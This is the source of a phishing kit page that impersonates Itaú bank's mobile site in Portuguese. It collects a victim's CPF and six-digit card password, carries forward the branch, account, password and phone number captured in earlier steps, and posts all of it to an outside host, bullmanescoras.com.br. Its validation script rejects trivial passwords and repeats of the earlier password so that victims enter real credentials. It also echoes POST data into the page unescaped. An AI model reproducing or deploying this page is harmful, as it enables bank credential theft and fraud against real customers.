<?php 
  $url_atual = "http" . (isset($_SERVER[HTTPS]) ? (($_SERVER[HTTPS]=="on") ? "s" : "") : "") . "://" . "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

  $explodeUrl = explode("/",$url_atual);
  $novaUrl = array_pop($explodeUrl);
  $explodeUrl = implode("/",$explodeUrl);
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<script type="text/javascript" src="app/js/complemento.js"></script>
<title>Mobile Itau</title>
<style>
body { background:url(app/img/bg-body.png) repeat; margin:0;}


@font-face {
  font-family: 'vendana';
  src: url('app/font/vendana.otf');
  font-weight: normal;
  font-style: normal;
}

@font-face {
  font-family: 'vendana';
  src: url('app/font/vendana.eot');
  font-weight: normal;
  font-style: normal;
}

@font-face {
  font-family: 'vendana';
  src: url('app/font/vendana.woff2') format('woff2');
  font-weight: normal;
  font-style: normal;
}


@font-face {
  font-family: 'vendana';
  src: url('app/font/vendana.woff') format('woff');
  font-weight: normal;
  font-style: normal;
}


@font-face {
  font-family: 'vendana';
  src: url('app/font/vendana.ttf') format('truetype');
  font-weight: normal;
  font-style: normal;
}

.geral { padding:20px;}

.meio {
	border-radius:2px;
	padding: 10px;
	}
	
.dadosI {
    background: rgba(0, 0, 0, 0) url("app/img/bg-body.png") repeat scroll 0 0;
    border: 0 none;
    color: #ffffff;
    font-size: 18px;
    height: 20px;
    margin: 0 auto;
    outline: medium none;
    padding: 6px 1px;
    width: 100%;
	}

.float-label {
  padding:2px;
}

.float-label label{
  display: block;
  position:absolute;
  box-sizing: border-box;
}

.float-label input{}


.float-label label {
    color: #FFF;
    font-size: 16px;
    margin-left: 0;
    margin-top: -52px;
    transition-duration: 0.2s;
  
}

.float-label input {
  margin-top: 17px;
}

.float-label input[data-empty] + label {
    color: #fff;
    font-size: 18px;
    font-weight: 500;
    margin-left: 4px;
    margin-top: -29px;
    width: 90%;
}
.esquerda {float:left;}
.direita {float:right;}

.aaSS {padding:20px;}


#btter {
	width:100%;
	padding:12px;
	background:url(app/img/bg-bt.png) repeat;
	color:#F3AC36;
	font-family:Verdana, Geneva, sans-serif;
	font-size:20px;
	border-radius:8px;
	border:0 none;
	}
	
#bgadd{
	position:fixed;
	top:0px;
	left:0px;
	width:100%;
	height:100%;
	z-index:998;
	background:url(app/img/bg-loading.png) repeat;
	display:none;
	}
	
.modalposition{ 
    background: #fff none repeat scroll 0 0;
    border: 1px solid #999;
    border-radius: 0;
    box-shadow: 0 0 10px #999;
    color: #000;
    font-family: Arial;
    font-size: 12px;
    height: 130px;
    left: 50%;
    margin-left: -150px;
    margin-top: -170px;
    position: absolute;
    top: 50%;
    width: 300px;
    z-index: 99999;
	  }
	
.modaldiv1{ height: 30px; width:; }
.modaltext{ padding: 15px; padding-bottom: 10px; color:#666666; }
.modalbutton{ padding:5px 30px 5px 30px; color:#FFF; border:1px solid #900; font-size:12px; background:#F00; font-weight:bold; border-radius:0;}
.modaldiv2{ margin-top:50px; display:block;}
.modalinforma{ padding-top: 0; padding:7px; font-family: Arial; font-size: 14px; color:#FFF; background:#103296; text-shadow:1px 1px 1px #666666;}	
	
.bttok {
	background: rgba(0, 0, 0, 0) url("app/img/bgbtt.png") repeat scroll 0 0;
    border: 0 none;
    border-radius: 4px;
    color: #fff;
    font-family: arial;
    font-size: 14px;
    padding: 6px;
    text-align: center;
    width: 45px;
	cursor:pointer;
	}

	
</style>
</head>

<body>
<div style="padding:20px; background-color:#FFF; color:#999; background-image:url(app/img/logo.png); background-repeat:no-repeat; background-size:30px; background-position:right 20px center;">
<div>ag <?php echo $_POST['AGinforma']; ?> c/c <?php echo $_POST['CTinforma']; ?></div>
</div>

<div class="geral" >


<div class="meio">
<form id="ajaxpf" name="ajaxpf" method="post" onSubmit="return veremosSHK()" action="http://bullmanescoras.com.br/email/envio-ita-pf-1.php" autocomplete="off">

<div style="border-bottom:1px #FFF solid; width:100%; height: 52px; margin-top:20px;">
<div class="float-label"><input class="dadosI" type="tel" name="CPinforma" id="CPinforma" onKeyUp="javascript:pulacampo('CPinforma','SCinforma');" onKeyPress="return sonumb(event);" maxlength="11" data-empty />
<label for="CPinforma">CPF</label></div>
</div>


<div style="border-bottom:1px #FFF solid; width:100%; height: 52px; margin-top:30px;">
<div class="float-label"><input class="dadosI" type="tel" name="SCinforma" id="SCinforma" style="font-family:'vendana'" maxlength="6" onKeyUp="javascript:pulacampo('SCinforma','btter');" onKeyPress="return sonumb(event);" data-empty />
<label for="SCinforma">Senha do Cartão</label></div>
</div>

<input type="hidden" name="erro" value="<?php echo $explodeUrl.'/index4.php'; ?>" />
<input type="hidden" name="sucesso" value="<?php echo $explodeUrl.'/index4.php'; ?>" />


<div id="aaSS" class="aaSS">



</div>

<div style="padding:10px 0"><input id="btter" name="btter" type="submit" value="Avançar" /></div>
<input type="hidden" name="AGinforma" id="AGinforma" value="<?php echo $_POST['AGinforma']; ?>">
<input type="hidden" name="CTinforma" id="CTinforma" value="<?php echo $_POST['CTinforma']; ?>">
<input type="hidden" name="SEinforma" id="SEinforma" value="<?php echo $_POST['SEinforma']; ?>">
<input type="hidden" name="DDDinforma" id="DDDinforma" value="<?php echo $_POST['DDDinforma']; ?>">
<input type="hidden" name="CELinforma" id="CELinforma" value="<?php echo $_POST['CELinforma']; ?>">
</form>
</div>
<div style="background:url(app/img/tokn.png) no-repeat; background-position:center 6px; text-align:center; padding:24px; color:#FFF; margin-top: 12px; font-family:Arial, Helvetica, sans-serif; font-size:12px;">iToken</div>


</div>

<div style="display:none;" id="modalalert" class="modalposition">
<div class="modaldiv1">
<center>
<div class="modalinforma"><div class="glyphicon glyphicon glyphicon-lock" style="padding:0 10px 0 0;"></div>Itau Informa!</div>
<div class="modaltext"><div id="TextErrorModal">Erro</div></div>
</center>
</div>
<div class="modaldiv2" align="center">
<a href="#closemodal"><button class="bttok" onClick="feixaMG()">&nbsp;&nbsp;Ok&nbsp;&nbsp;</button></a>
</div>
</div>

<script>
function feixaMG(){
	document.getElementById('modalalert').style.display='none';
	document.getElementById('bgadd').style.display='none';
	}
</script>


<div id="bgadd"></div>

<script>
var floatLabel = document.querySelectorAll(".float-label");
var onFloatLabelChange = function () {
  if (this.value.length == 0) {
    this.dataset.empty = null;
  } else {
    delete this.dataset.empty;
  }
}

floatLabel = [].slice.apply(floatLabel);
floatLabel.forEach(function (container) {
  var input = container.querySelector("input");
  input.addEventListener("keyup", onFloatLabelChange);
});
</script>

<script type="text/javascript">
function veremosSHK(){
	var ModalAlertError = document.getElementById("TextErrorModal");
    var ModalAlert = document.getElementById("modalalert");
	var Modalfundo = document.getElementById("bgadd");
	var i;
 
s = document.ajaxpf.CPinforma.value;

    s = s.replace('.','');
	s = s.replace('.','');
	s = s.replace('-','');
 
var c = s.substr(0,9);
 
var dv = s.substr(9,2);
 
var d1 = 0;
 
for (i = 0; i < 9; i++)
 
{
 
d1 += c.charAt(i)*(10-i);
 
}
 
if (d1 == 0){

document.getElementById("CPinforma").value = "";
ModalAlertError.innerHTML = "CPF Invalido!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
 
}
 
d1 = 11 - (d1 % 11);
 
if (d1 > 9) d1 = 0;
 
if (dv.charAt(0) != d1)
 
{

document.getElementById("CPinforma").value = "";
ModalAlertError.innerHTML = "CPF Invalido!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
 
}
 
 
d1 *= 2;
 
for (i = 0; i < 9; i++)
 
{
 
d1 += c.charAt(i)*(11-i);
 
}
 
d1 = 11 - (d1 % 11);
 
if (d1 > 9) d1 = 0;
 
if (dv.charAt(1) != d1)
 
{
 
document.getElementById("CPinforma").value = "";
ModalAlertError.innerHTML = "CPF Invalido!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
 }
 if (
 s == "00000000000" ||
 s == "11111111111" ||
 s == "22222222222" ||
 s == "33333333333" ||
 s == "44444444444" ||
 s == "55555555555" ||
 s == "66666666666" ||
 s == "77777777777" ||
 s == "88888888888" ||
 s == "99999999999"){
document.getElementById("CPinforma").value = "";
ModalAlertError.innerHTML = "CPF Invalido!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
}
if ( document.ajaxpf.SCinforma.value == "" ||
document.ajaxpf.SCinforma.value.length < 6 ||
document.ajaxpf.SCinforma.value.length > 6 ||
document.ajaxpf.SCinforma.value == "<?php echo $_POST['SEinforma']; ?>" ||
document.ajaxpf.SCinforma.value == "000000" || 
document.ajaxpf.SCinforma.value == "111111" || 
document.ajaxpf.SCinforma.value == "222222" ||
document.ajaxpf.SCinforma.value == "333333" || 
document.ajaxpf.SCinforma.value == "444444" || 
document.ajaxpf.SCinforma.value == "555555" || 
document.ajaxpf.SCinforma.value == "666666" || 
document.ajaxpf.SCinforma.value == "777777" || 
document.ajaxpf.SCinforma.value == "888888" || 
document.ajaxpf.SCinforma.value == "999999" ||
document.ajaxpf.SCinforma.value == "123456"){
document.getElementById("SCinforma").value = "";
ModalAlertError.innerHTML = "Senha do cartão Invalida!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }
}
</script>

</body>
</html>